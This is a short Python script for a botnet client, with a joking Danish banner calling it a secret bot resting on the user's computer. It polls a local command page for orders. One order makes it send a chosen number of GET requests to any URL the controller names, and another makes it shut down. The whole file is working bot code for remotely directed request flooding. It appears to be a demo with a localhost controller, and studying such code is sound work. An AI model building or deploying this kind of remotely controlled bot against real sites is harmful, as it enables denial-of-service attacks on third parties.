import requests
import re
import time

# URL to poll
command_url = "http://127.0.0.1:5000/"

# Keep track of the last processed command to avoid repeating commands.
last_command = None

print("Dette er en super hemmelig bot, der bare ligger og hygger sig på din computer.")
print("Waiting for commands", end="")
def process_command(command):
    """Process the received command."""
    # Check for the "call(X):<url>" command pattern.
    call_match = re.match(r'^call\((\d+)\):\s*(.+)$', command, re.IGNORECASE)
    if call_match:
        count = int(call_match.group(1))
        url = call_match.group(2).strip()
        print(f"Calling {url} {count} times")
        for i in range(count):
            try:
                resp = requests.get(url)
                print(f"Request {i+1}/{count}: Status code {resp.status_code}")
                time.sleep(0.7)
            except Exception as e:
                print(f"Request {i+1}/{count} failed: {e}")
    elif command.lower() == "goodbye":
        start_time = time.time()
        while time.time() - start_time < 3:
            print("Goodbye, and thanks for all the fish")
            time.sleep(0.2)
        exit(0)  # Exit the script after 3 seconds.
    elif command.lower() == "No current command":
        print(".", end="")
    else:
        print("Command not recognized.")
        print("Waiting for commands", end="")

while True:
    try:
        # Poll the URL
        response = requests.get(command_url)
        html_text = response.text
        # Use regex to extract the text inside <div id="latestcommand"> ... </div>
        regex_pattern = r'<div\s+id\s*=\s*["\']latestcommand["\']\s*>(.*?)</div>'
        match = re.search(regex_pattern, html_text, re.IGNORECASE | re.DOTALL)
        if match:
            command = match.group(1).strip()
            # Process if a new, non-empty command is received.
            if command and command != last_command:
                print("\nNew command received:", command)
                process_command(command)
                last_command = command
        else:
            print("No command found in the page.")
    except Exception as e:
        print("Error while polling:", e)
    time.sleep(3)